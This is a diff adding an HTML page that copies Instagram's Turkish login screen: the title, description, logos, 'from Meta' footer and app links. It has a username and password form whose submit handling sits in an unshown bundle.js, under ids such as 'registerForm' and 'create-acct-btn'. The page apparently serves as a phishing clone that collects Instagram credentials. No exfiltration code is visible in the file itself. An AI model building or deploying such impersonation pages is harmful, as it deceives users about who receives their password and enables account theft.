@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş yap • Instagram</title>
+    <link rel="icon" type="image/x-icon" href="img/instagram.png" />
+    <link rel="shortcut icon" href="instagram.png" type="image/x-icon" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster" />
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
+    <link rel="stylesheet" href="style.css" />
+    <meta content="Welcome back to Instagram. Sign in to check out what your friends, family &amp; interests have been capturing &amp; sharing around the world." name="description">
+    <style>
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #000000;
+            font-size: 14px;
+       
+        }
+        .loader-button{
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            
+        }
+        .loader {
+            color: white;
+            border: 4px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 4px solid #3498db;
+            width: 20px;
+            height: 20px;
+            animation: spin 2s linear infinite;
+           
+          
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="col image">
+            <a href="https://imgbb.com/"><img src="https://i.ibb.co/Q8X79RK/image.png" alt="instagram" id="image"></a>
+        </div>
+        <div class="col content">
+            <div class="box">
+                <div class="title">
+                    <a href="https://ibb.co/XtKd6c7"><img src="https://i.ibb.co/2dCLRGv/logoname.png" alt="logoname" border="0"></a>
+                </div>
+                <div class="login-form" id="registerForm">
+                    <!-- <div class="form-content">
+                        <input type="text" name="email" id="email-signup" />
+                        <label for="email">E-posta</label>
+                    </div> -->
+                    <div class="form-content">
+                        <input type="text" name="username" id="username-signup" required />
+                        <label for="username">Telefon numarası, kullanıcı adı veya e-posta</label>
+                    </div>
+                    <div class="form-content">
+                        <input type="password" name="password" id="password-signup" required />
+                        <label for="password">Şifre</label>
+                        <span class="password-toggle" id="password-toggle" >Göster</span>
+                    </div>
+                    <div class="form-content">
+                        <button id="create-acct-btn">Giriş Yap</button>
+                        <button id="loader-button" class="loader-button">
+                            <div class="loader" id="loader"></div>
+                        </button>
+                    </div>
+                    <div class="form-ending">
+                        <center>
+                            <p id="OR">YA DA</p>
+                            <span id="line"></span>
+                        </center>
+                        <p id="facebook"><i class="fab fa-facebook-square"></i>Facebook ile Devam Et</p>
+                        <a href="#">Şifreni mi unuttun?</a>
+                    </div>
+                </div>
+            </div>
+            <div class="mini-box">
+                <div class="text">Hesabın Yok mu? <a href="#">Kaydol</a></div>
+            </div>
+            <div class="download-section">
+                <p>Uygulamayı al.</p>
+                <div class="images">
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=tr"><img src="https://i.ibb.co/5KyMHpd/appstore.png" alt="appstore" border="0"></a>
+                    <a href="https://apps.apple.com/tr/app/instagram/id389801252"><img src="https://i.ibb.co/ZTHhz0b/playstore.png" alt="playstore" border="0"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="foot">
+            <div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1" style="height: 26px; width: 52px;"><img alt="from Meta" src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg"></div>
+        </div>
+    </footer>
+    <script>
+    
+      
+        document.getElementById('password-toggle').addEventListener('click', togglePasswordVisibility);
+
+        function togglePasswordVisibility() {
+            const passwordField = document.getElementById('password-signup');
+            const passwordToggle = document.getElementById('password-toggle');
+            const fieldType = passwordField.getAttribute('type');
+            
+                    
+            if (fieldType === 'password') {
+                passwordField.setAttribute('type', 'text');
+                passwordToggle.textContent = 'Gizle';
+            } else {
+                passwordField.setAttribute('type', 'password');
+                passwordToggle.textContent = 'Göster';
+            }
+        }
+    </script>
+    <script type="module" src="bundle.js"></script>
+</body>
+</html>
